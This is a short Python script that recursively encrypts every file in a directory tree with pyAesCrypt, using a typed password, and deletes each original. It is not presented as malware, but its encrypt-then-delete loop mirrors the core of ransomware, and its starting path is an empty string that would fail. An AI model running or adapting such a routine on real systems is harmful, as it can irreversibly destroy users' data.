import pyAesCrypt
import os

# File encryption function

def encryption(file, password):

    # Set the buffer size
    buffer_size = 512 * 1024

    # Calling the encryption method

    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".crp",
        password,
        buffer_size
    )

    # Displaying the name of the encrypted file

    print("[File '" + str(os.path.splitext(file)[0]) + "' encrypted]")

    # Deleting the source file

    os.remove(file)

# Directory scanning function

def walking_by_dirs(dir, password):

    # Loop through all subdirectories in the specified directory
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # If we find a file, we encrypt it
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                 print(ex)
        # If we find a directory, we repeat the cycle looking for files
        else:
            walking_by_dirs(path, password)

password = input("Enter your password for encryption: ")
walking_by_dirs("", password)